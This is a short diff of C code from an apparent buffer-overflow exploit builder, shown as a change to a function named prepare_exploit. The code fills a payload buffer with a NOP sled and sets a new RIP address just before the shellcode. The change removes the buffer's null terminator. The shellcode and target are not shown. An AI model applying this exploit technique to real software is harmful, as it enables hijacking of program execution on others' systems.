@@ -117,13 +117,12 @@ status_t prepare_exploit (char* (*data),
                       + strlen (shellcode); // Payload
 
 	// Get storage for payload
-	char* _data = (char*) malloc (data_size + 1);
+	char* _data = (char*) malloc (data_size);
 	if (_data == NULL)
 		return failure ("Could not allocate memory for payload");
 
-	// Prepare a proper C-string filled with IA32 NOPs
+	// Fill with IA32 NOPs
 	memset (_data, 0x90, data_size);
-	_data [data_size] = '\0';
 
 	// Set the RIP to the highest address before the shell code
 	uint64_t new_rip = main_buf_addr + data_size - strlen (shellcode);
